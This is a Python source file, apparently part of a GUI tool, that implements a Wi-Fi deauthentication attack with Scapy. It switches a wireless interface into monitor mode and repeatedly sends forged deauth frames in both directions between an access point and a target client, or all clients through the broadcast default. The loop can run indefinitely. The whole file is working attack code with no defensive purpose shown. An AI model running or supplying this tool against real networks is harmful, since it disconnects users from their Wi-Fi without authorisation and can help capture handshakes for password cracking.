import time
import random
import threading
from scapy.all import *
import kick_deauth_graphique
import sys
import os

class kick_deauth(threading.Thread):

	def __init__(self,mac_dst,mac_ap,cannal_ap,nombre,attente,interface):

		threading.Thread.__init__(self)
		self.stopper=threading.Event()
				

		if(mac_dst == ""):
			self.mac_dst="ff:ff:ff:ff:ff:ff"
		else:
			self.mac_dst=mac_dst

		if(mac_ap == ""):
			self.mac_ap="ff:ff:ff:ff:ff:ff"
		else:
			self.mac_ap=mac_ap
	
		if(cannal_ap != ""):
			self.cannal=int(cannal_ap)
		else:
			self.cannal="1"
		
		##TEST DE L'INTERFACE D'ENVOI
		

		if(interface != ""):
			print("interface not chosen automatically")
			conf.iface=interface
			self.iface=interface
		else:
			self.iface=conf.iface
			print("interface chosen automatically")

		
		print("PACKETS SENDING INTERFACE:"+self.iface)
		


		##TEST DU DELAI AVANT CHAQUE ENVOI
		if(attente == ""):
			self.delai=0.2
		else:
			self.delai=float(attente)


		if(nombre == ""):
			self.n=-1
		else:
			self.n=int(nombre)

	def run(self):	
		
		if(kick_deauth_graphique.verrou.locked()):
			print("\n ERROR ANOTHER ATTACK IN PROGRESS DETECTED")

		else:
			print("\n NO ATTACK IN PROGRESS DETECTED\n")

			kick_deauth_graphique.verrou.acquire()
		
		
			time.sleep(3)
			print("\n Starting the Attack WIFI DEAUTHENTIFICATION --"+time.ctime()+"\n")
			nbre=0
			if(self.n == -1):
				while(1==1 and not(self.stopper.isSet())):
					os.system("ifconfig "+self.iface+" down")
					os.system("iwconfig "+self.iface+" mode monitor")
					
					os.system("ifconfig "+self.iface+" up")

					if(self.cannal!=""):
						os.system("iwconfig "+self.iface+" channel "+str(self.cannal))

					packet = RadioTap()/Dot11(type=0,subtype=12,addr1=self.mac_dst,addr2=self.mac_ap,addr3=self.mac_ap)/Dot11Deauth(reason=4) #DE L'AP AU CLIENT
					packet1=RadioTap()/Dot11(type=0,subtype=12,addr1=self.mac_ap,addr2=self.mac_dst,addr3=self.mac_ap)/Dot11Deauth(reason=4) #DU CLIENT VERS L'AP		
					sendp(packet)
					sendp(packet1)
					time.sleep(self.delai)
					nbre=nbre+1

				print("number of packets="+str(nbre))
				if(not self.stopper.isSet()):
					print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
				else:
					print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")
			else:
				i=0
				for i in range(0,self.n):
					os.system("ifconfig "+self.iface+" down")
					os.system("iwconfig "+self.iface+" mode monitor")
					
					os.system("ifconfig "+self.iface+" up")

					if(self.cannal!=""):
						os.system("iwconfig "+self.iface+" channel "+str(self.cannal))
					#DE L'AP AU CLIENT

					packet1 = RadioTap()/Dot11(type=0,subtype=12,addr1=self.mac_dst,addr2=self.mac_ap,addr3=self.mac_ap)/Dot11Deauth(reason=7)
					#DU CLIENT VERS L'AP					
					packet2 = RadioTap()/Dot11(type=0,subtype=12,addr1=self.mac_ap,addr2=self.mac_dst,addr3=self.mac_ap)/Dot11Deauth(reason=7)
					sendp(packet1)
					sendp(packet2)
					time.sleep(self.delai)
					nbre=nbre+1
					if(self.stopper.isSet()):
						break
				print("number of packets="+str(nbre))
				if(not self.stopper.isSet()):
					print("END OF PACKET EMISSIONS"+time.ctime()+"\n")
				else:
					print("END OF PACKET EMISSIONS (THE ATTACK HAS BEEN STOPPED BY THE USER)"+time.ctime()+"\n")

			
			os.system("ifconfig "+self.iface+" down")
			os.system("iwconfig "+self.iface+" mode managed")
					
			os.system("ifconfig "+self.iface+" up")

			kick_deauth_graphique.verrou.release()


	
	def state_launch_boutton(self):
		return self.stopper.isSet()
	
	def stop(self):
		self.stopper.set()
	
	def randommac():
		mac = [ random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random.randint(0x00, 0x7f),
			random.randint(0x00, 0x7f),
			random.randint(0x00, 0xff),
			random.randint(0x00, 0xff) ]
		return ':'.join(map(lambda x: "%02x" % x, mac))		
